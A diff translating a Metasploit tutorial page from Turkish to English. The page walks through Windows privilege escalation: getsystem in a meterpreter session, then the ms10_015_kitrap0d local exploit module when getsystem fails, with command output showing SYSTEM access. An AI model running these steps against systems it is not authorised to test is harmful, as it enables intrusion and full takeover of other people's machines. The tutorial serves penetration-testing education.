@@ -1,13 +1,13 @@
 ---
 draft: false
-title: MSF Yetki Yükseltme
-linkTitle: Yetki Yükseltme
+title: MSF Privilege Escalation
+linkTitle: Privilege Escalation
 translationKey: msf-privilage-escalation
 weight: 240
 date: 2017-05-25T13:16:00+03:00
 author: İbrahim Korucuoğlu ([@siberoloji](https://github.com/siberoloji))
-description: yetki yükseltme olarak ifade edilen ( Privilege Escalation) kavramı inceleyeceğiz.
-url: /tr/msf-yetki-yukseltme/
+description: Privilege escalation is the act of exploiting a bug, design flaw or configuration oversight in an operating system or software application to gain elevated access to resources that are normally protected from an application or user.
+url: /msf-privilege-escalation/
 featured_image: /images/metasploit.jpg
 categories:
    - Metasploit Framework
@@ -15,17 +15,17 @@ tags:
    - cybersecurity
    - metasploit framework
 ---
-## Ya sonra?
+## What next?
 
-Bir sistemin zafiyetini bulmak için gerekli çalışmaları yaptınız. Açık noktasını buldunuz ve doğru adımları uyguladıktan sonra hedef bilgisayarda bir komut satırı açmayı başardınız. Peki bundan sonra ne yapılmalı?
+You have done the necessary work to find a system's vulnerability. You have found the vulnerability and after following the correct steps, you have managed to open a command line on the target computer. So what should be done next?
 
-Bu yazımızdan itibaren yetki yükseltme olarak ifade edilen (İng: Privilege Escalation) kavramı inceleyeceğiz. Karşı sisteme erişim sağlayan güvenlik denetçisini bu aşamadan itibaren ilerleme sağlamayı hedeflemelidir. Ağda devam eden iletişimi kontrol etme, hash değerlerini elde etme bunlara örnek olarak verilebilir. Bir diğer hedef ise, bu bilgisayarı basamak olarak kullanarak (İng: Pivoting) başka bilgisayarlara erişim sağlamak olmalıdır.
+From this article on, we will examine the concept of privilege escalation. The security auditor who accesses the opposing system should aim to progress from this stage onwards. Controlling ongoing communication on the network and obtaining hash values ​​can be given as examples of these. Another goal should be to access other computers using this computer as a step (Eng: Pivoting).
 
-Kullandığınız zafiyet ve buna yönelik exploit modülü karşı bilgisayarda oturum açmanıza yaramış olsa bile yetkisiz bir oturum açmış olabilirsiniz. Bu durumda yapabileceğiniz işlemler kısıtlı olacaktır. Böyle durumlar için Metasploit Framework içerisinde bulunan bir kaç alternatif modül bulunmaktadır. bunlardan bir tanesi de `getsystem` komutudur.
+Even if the vulnerability you used and the exploit module for it helped you log in to the opposing computer, you may have opened an unauthorized session. In this case, the operations you can do will be limited. There are a few alternative modules in the Metasploit Framework for such cases. One of them is the `getsystem` command.
 
-## Yetkisiz Oturum
+## Unauthorized Session
 
-Aşağıdaki örnekte görüldüğü gibi, hedef sistemde `ms10_002_aurora` modülü kullanılarak yetkisiz bir meterpreter oturumu açılmıştır.
+As seen in the example below, an unauthorized meterpreter session was opened on the target system using the `ms10_002_aurora` module.
 
 ```bash
 msf exploit(ms10_002_aurora) >
@@ -43,7 +43,7 @@ meterpreter >
 
 ## GetSystem
 
-`getsystem` komutunu kullanabilmek için öncelikle `priv` eklentisini sisteme yükleyelim.
+`getsystem` command To use it, first let's load the `priv` extension to the system.
 
 ```bash
 meterpreter > use priv
@@ -51,7 +51,7 @@ Loading extension priv...success.
 meterpreter >
 ```
 
-`getsystem -h` komutunda olduğu gibi `-h` parametresini kullandığınızda kullanılabilir seçenekleri görebilirsiniz.
+As in the `getsystem -h` command, you can see the available options when you use the `-h` parameter.
 
 ```bash
 meterpreter > getsystem -h Usage: getsystem [options]
@@ -60,8 +60,8 @@ Attempt to elevate your privilege to that of local system.
 
 OPTIONS:
 
--h        Help Banner.
--t <opt>  The technique to use. (Default to '0').
+-h Help Banner.
+-t <opt> The technique to use. (Default to '0').
 0 : All techniques available
 1 : Service - Named Pipe Impersonation (In Memory/Admin)
 2 : Service - Named Pipe Impersonation (Dropper/Admin)
@@ -70,7 +70,7 @@ OPTIONS:
 meterpreter >
 ```
 
-```getsystem``` komutuna hiçbir parametre vermezseniz, varsayılan olarak tüm ihtimalleri deneyecektir.
+If you do not give any parameters to the ```getsystem``` command, it will try all possibilities by default.
 
 ```bash
 meterpreter > getsystem
@@ -80,9 +80,9 @@ Server username: NT AUTHORITY\SYSTEM
 meterpreter >
 ```
 
-## Yerel Exploit Kullanma
+## Using Local Exploit
 
-Bazı durumlarda `getsystem` başarısız olur. Aşağıda bunun örneğini görebilirsiniz. `getsystem` başarısız olduğunda oturumu arka plana gönderip, Metasploit Framework içerisindeki diğer exploit modüllerini kullanmak gerekmektedir.
+In some cases, `getsystem` fails. You can see an example of this below. When `getsystem` fails, it is necessary to send the session to the background and use other exploit modules in the Metasploit Framework.
 
 ```bash
 meterpreter > getsystem
@@ -90,7 +90,7 @@ meterpreter > getsystem
 meterpreter >
 ```
 
-Yukarıda başarısız olmuş bir `getsystem` komutu çıktısı görülüyor. Şimdi bunu arka plana gönderelim ve kullanılabilir durumdaki yerel exploit modüllerine bakalım.
+Above is the output of a failed `getsystem` command. Let's send it to the background and look at the available local exploit modules.
 
 ```bash
 meterpreter > background
@@ -109,7 +109,7 @@ use exploit/windows/local/ms13_081_track_popup_menu
 msf exploit(ms10_002_aurora) >
 ```
 
-Bu listedeki modüllerden `exploit/windows/local/ms10_015_kitrap0d` modülünü kullanalım.
+Let's use the `exploit/windows/local/ms10_015_kitrap0d` module from the modules in this list.
 
 ```bash
 msf exploit(ms10_002_aurora) > use exploit/windows/local/ms10_015_kitrap0d
@@ -156,7 +156,7 @@ msf exploit(ms10_015_kitrap0d) > exploit
 >  Meterpreter session 2 opened (192.168.1.161:4443 -> 192.168.1.71:49204) at 2014-03-11 11:14:00 -0400
 ```
 
-Gerekli modül ve payload ayarlarını yaptıktan sonra çalıştırılan exploit, hedef sistemde bir oturum açmayı başarmıştır. Şimdi `getuid` komutunu verdiğimizde `SYSTEM` yetkili bir kullanıcı gibi hareket edilebileceği aşağıda görülmektedir.
+After making the necessary module and payload settings, the exploit that was run managed to open a session on the target system. Now, when we give the `getuid` command, we can act as an authorized user `SYSTEM` as seen below.
 
 ```bash
 meterpreter > getuid
